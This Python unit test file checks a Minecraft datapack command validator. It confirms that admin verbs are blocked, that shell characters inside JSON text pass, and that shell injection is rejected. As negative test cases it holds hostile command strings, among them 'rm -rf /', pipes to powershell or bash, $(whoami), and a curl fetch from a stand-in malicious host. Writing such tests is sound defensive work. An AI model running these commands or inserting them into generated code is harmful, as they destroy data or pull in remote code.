"""
Unit tests for B14: Minecraft Command Security wiring, dynamic verb loading, and JSON component protection.

Verifies:
1. Verbs loaded dynamically from knowledge assets include commands previously missing:
   data, kill, gamemode, title, item, loot, advancement, team, setblock, fill, trigger.
2. Shell-pattern checks apply ONLY to command structure, not to JSON text components or chat:
   - tellraw with semicolons, ampersands, pipes, and words like 'system' or 'sh' inside JSON passes.
   - say with semicolons, pipes, and 'system' passes.
   - item custom_data components pass.
3. Actual shell injection attempts in command structure are blocked:
   - semicolons outside quotes/JSON
   - pipes to powershell / bash
   - command substitution $(...) and `...`
   - chained execute run with unauthorized verbs or shell binaries
4. Administrative commands (ban, op, stop, etc.) remain blocked.
5. DatapackValidator executes command security during function validation.
"""

import tempfile
import unittest
from pathlib import Path

from security.command_security import (
    ALLOWED_COMMAND_VERBS,
    CommandSecurityError,
    load_allowed_command_verbs,
    validate_mcfunction_content,
    validate_minecraft_command,
)
from validator.datapack_validator import DatapackValidator


class TestAuditB14CommandSecurity(unittest.TestCase):

    def test_dynamic_verbs_include_standard_gameplay_commands(self):
        """Verbs loaded from knowledge include all standard vanilla commands."""
        verbs = load_allowed_command_verbs("1.21.11")
        required_verbs = [
            "data",
            "kill",
            "gamemode",
            "title",
            "item",
            "loot",
            "advancement",
            "team",
            "setblock",
            "fill",
            "trigger",
            "damage",
            "attribute",
            "scoreboard",
            "execute",
        ]
        for verb in required_verbs:
            self.assertIn(verb, verbs, f"Expected '{verb}' to be in allowed command verbs")

    def test_administrative_commands_blocked(self):
        """Server admin/console verbs (ban, op, stop, etc.) are blocked."""
        admin_verbs = ["ban", "ban-ip", "banlist", "deop", "kick", "op", "pardon", "stop", "whitelist"]
        verbs = load_allowed_command_verbs("1.21.11")
        for verb in admin_verbs:
            self.assertNotIn(verb, verbs, f"Admin verb '{verb}' should NOT be in datapack verbs")
            with self.assertRaises(CommandSecurityError):
                validate_minecraft_command(f"{verb} player123")

    def test_json_text_components_with_shell_chars_allowed(self):
        """Legitimate tellraw and say commands with ;, &, |, 'system', 'sh' inside JSON/chat pass."""
        safe_commands = [
            'tellraw @a {"text": "System notification; status: OK & verified | all good"}',
            'tellraw @a {"text": "sh! quiet please"}',
            'title @a actionbar {"text": "Alert; system online & running | ready"}',
            'say System reboot complete; please wait & enjoy | version 1.21',
            'say shhh...',
            'give @a diamond[custom_data={system: 1, sh: 2}] 1',
            'execute as @a at @s run setblock ~ ~ ~ stone',
            'kill @e[type=zombie]',
            'data get entity @s SelectedItem',
            'item replace entity @a weapon.mainhand with diamond_sword',
            'gamemode survival @a',
            'trigger my_trigger add 1',
        ]
        for cmd in safe_commands:
            try:
                res = validate_minecraft_command(cmd)
                self.assertEqual(res, cmd)
            except CommandSecurityError as e:
                self.fail(f"Legitimate command was incorrectly blocked: '{cmd}' -> {e}")

    def test_shell_injection_in_command_structure_blocked(self):
        """Shell injection attempts outside JSON/quotes are caught and rejected."""
        dangerous_commands = [
            "give @a diamond; rm -rf /",
            "give @a diamond | powershell -c calc",
            "give @a diamond & bash -c 'echo bad'",
            "scoreboard players set @s $(whoami) 1",
            "scoreboard players set @s `id` 1",
            "execute as @a run bash evil.sh",
            "execute as @a run cmd.exe /c dir",
            "execute as @a run powershell.exe",
            "python script.py",
            "curl http://malicious.site/script.sh",
        ]
        for cmd in dangerous_commands:
            with self.assertRaises(CommandSecurityError, msg=f"Command should be blocked: '{cmd}'"):
                validate_minecraft_command(cmd)

    def test_datapack_validator_enforces_command_security(self):
        """DatapackValidator catches command security violations in .mcfunction files."""
        with tempfile.TemporaryDirectory() as tmp_dir:
            pack_dir = Path(tmp_dir) / "test_pack"
            fn_dir = pack_dir / "data" / "custom" / "function"
            fn_dir.mkdir(parents=True)

            # Valid pack.mcmeta
            (pack_dir / "pack.mcmeta").write_text(
                '{"pack": {"pack_format": 94, "description": "Test Pack"}}',
                encoding="utf-8"
            )

            # Function with dangerous shell injection
            (fn_dir / "attack.mcfunction").write_text(
                "scoreboard players set @s timer 1\n"
                "give @a diamond; rm -rf /\n",
                encoding="utf-8"
            )

            validator = DatapackValidator(version="1.21.11")
            result = validator.validate(pack_dir)
            self.assertFalse(result.is_valid)
            sec_errors = [e for e in result.errors if e.code == "COMMAND_SECURITY_ERROR"]
            self.assertTrue(len(sec_errors) > 0, "Expected COMMAND_SECURITY_ERROR in validation issues")

    def test_datapack_validator_accepts_rich_json_commands(self):
        """DatapackValidator accepts functions with JSON text containing ;, &, |, system."""
        with tempfile.TemporaryDirectory() as tmp_dir:
            pack_dir = Path(tmp_dir) / "test_pack"
            fn_dir = pack_dir / "data" / "custom" / "function"
            fn_dir.mkdir(parents=True)

            (pack_dir / "pack.mcmeta").write_text(
                '{"pack": {"pack_format": 94, "description": "Test Pack"}}',
                encoding="utf-8"
            )

            (fn_dir / "main.mcfunction").write_text(
                'tellraw @a {"text": "System ready; check & play | safe"}\n'
                'say Hello world; this is system test & check\n'
                'give @a diamond 1\n',
                encoding="utf-8"
            )

            validator = DatapackValidator(version="1.21.11")
            result = validator.validate(pack_dir)
            sec_errors = [e for e in result.errors if e.code == "COMMAND_SECURITY_ERROR"]
            self.assertEqual(len(sec_errors), 0, f"Unexpected command security errors: {sec_errors}")


if __name__ == "__main__":
    unittest.main()
